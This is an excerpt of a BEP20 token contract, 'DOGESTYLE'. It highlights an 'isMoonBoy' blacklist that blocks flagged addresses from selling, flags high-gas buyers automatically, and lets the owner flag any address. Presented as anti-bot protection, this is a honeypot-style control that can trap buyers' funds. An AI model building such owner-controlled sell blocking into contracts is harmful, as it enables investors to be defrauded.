...
links:
https://dogestyle.dog
https://twitter.com/dogestyletoken
https://t.me/dogestyle_token
https://linktr.ee/Dogestyle
*/
...
contract DOGESTYLE is IBEP20, Auth {
    ...
    string constant _name = "DOGESTYLE";
    string constant _symbol = "DOGESTYLE";
    ...
    mapping (address => bool) public isMoonBoy;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xe4e239BAcED2C18F8708eab09389D76b018dD40D;
        devFeeReceiver = 0x3e1f19EF9fb650c027aAB9A7a3d2d74a43486161;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(rocketFuel){
            require(!isMoonBoy[sender],"Bots cant sell");
            if(tx.gasprice > maxFuelPrice && sender == pair){
                isMoonBoy[recipient] = true;
    ...
    function manage_moonBoys(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isMoonBoy[addresses[i]] = status;
        }
    }
